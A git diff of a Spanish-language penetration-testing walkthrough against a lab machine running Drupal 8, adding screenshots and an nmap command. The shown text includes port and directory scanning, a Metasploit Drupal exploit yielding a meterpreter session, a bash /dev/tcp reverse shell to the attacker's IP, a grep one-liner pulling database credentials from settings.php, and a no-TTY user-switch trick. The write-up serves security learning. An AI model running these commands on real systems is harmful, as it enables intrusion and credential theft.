@@ -28,27 +28,28 @@ El objetivo fue identificar servicios expuestos, reconocer la tecnología del si
 
     ping -c 1 172.17.0.2
 
+![Ping a la IP](screenshots/ping.PNG)
+
 Se comprobó que la máquina objetivo está activa.
 
 ---
 
 ### 2. Escaneo de puertos
 
-(Suponiendo el uso de nmap, se recomienda documentar el comando)
+        nmap -sC -sV -p- 172.17.0.2 -oN scan.txt
 
----
+![puertos](screenshots/snaceoPuertos.PNG)
 
-### 3. Identificación del CMS con WhatWeb
 
-    whatweb http://172.17.0.2
-
-Se identificó que el sitio web utiliza **Drupal 8**.
+Se identificó que el sitio web utiliza **Drupal 8** en el puerto 80.
 
 ---
 
 ### 4. Enumeración de directorios con Gobuster
 
     gobuster dir -u http://172.17.0.2/ -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt
+
+![directorios](screenshots/enumerarDirectorios.PNG)
 
 Se descubrieron los directorios:
 
@@ -64,7 +65,11 @@ Iniciamos Metasploit y buscamos exploits para Drupal 8:
     msfconsole
     search drupal 8
 
-Se selecciona el exploit:
+
+
+Y encontramos algunos exploits,seleccionamos el exploit:
+
+![metasploit](screenshots/metasploit.PNG)
 
     use 0
     show options
@@ -72,6 +77,8 @@ Se selecciona el exploit:
     run
 
 Se logró obtener una **sesión meterpreter** activa.
+
+![Ping a la IP](screenshots/meterpreter.PNG)
 
 ---
 
@@ -89,6 +96,8 @@ Y en la máquina víctima:
 
     bash -c "bash -i >& /dev/tcp/172.17.0.1/444 0>&1"
 
+![nc](screenshots/netcat.PNG)
+
 ---
 
 ### 7. Búsqueda de credenciales en settings.php
@@ -97,15 +106,22 @@ Visitamos HackTricks y usamos el siguiente comando:
 
     find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
 
+![hacktricks](screenshots/hacktricks.PNG)
+![user](screenshots/hacktricks.PNG)
+
 Esto nos permitió localizar posibles credenciales de base de datos y usuarios del sistema.
 
 ---
 
 ### 8. Intento de login con usuario encontrado
 
-Se prueba acceso con usuario `ballenita` pero no tiene permisos sudo. Se intenta acceso sin TTY:
+![ballenita](screenshots/suBallenita.PNG)
+
+Se prueba acceso con usuario `ballenita` pero no tiene permisos sudo. Se intenta un workaround (acceso sin TTY):
 
     script /dev/null -c "su ballenita"
+
+![entrando](screenshots/entrando.PNG)
 
 Funciona correctamente.
 
